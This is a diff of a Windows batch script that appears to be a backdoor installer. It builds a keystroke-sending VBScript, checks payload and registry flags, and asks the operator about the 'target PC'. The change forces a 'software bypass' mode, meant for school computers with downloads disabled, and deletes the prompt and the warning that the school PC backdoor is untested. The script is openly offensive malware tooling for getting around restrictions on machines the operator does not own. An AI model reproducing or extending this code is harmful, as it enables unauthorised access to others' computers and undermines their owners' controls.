@@ -12,7 +12,7 @@ ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
 ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
 CSCRIPT //nologo "%TempVBSFile%"
-set temp=0&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0
+set temp=0&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=true
 title unstable Release %update_number%
 cls
 if %username% equ 61481 goto skip_dev
@@ -43,10 +43,6 @@ if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
   choice /C YN /m "does target PC have admin rights? Y/N:
   if %errorlevel% equ 1 (set target_admin_rights=true) else (set target_admin_rights=false)&set errorlevel=0
   echo.  
-  echo [31mplease note that school PC backdoor is untested and non-school PC might be broken![0m
-  choice /C YN /m "is the target PC a school computer or have software downloads dissabled? Y/N:
-  if %errorlevel% equ 1 (set target_software_bypass=true) else (set target_software_bypass=false)&set errorlevel=0
-  echo.
   echo DO NOT USE SPACES, replace them with _
   echo.
   set /p opt1=Device name:
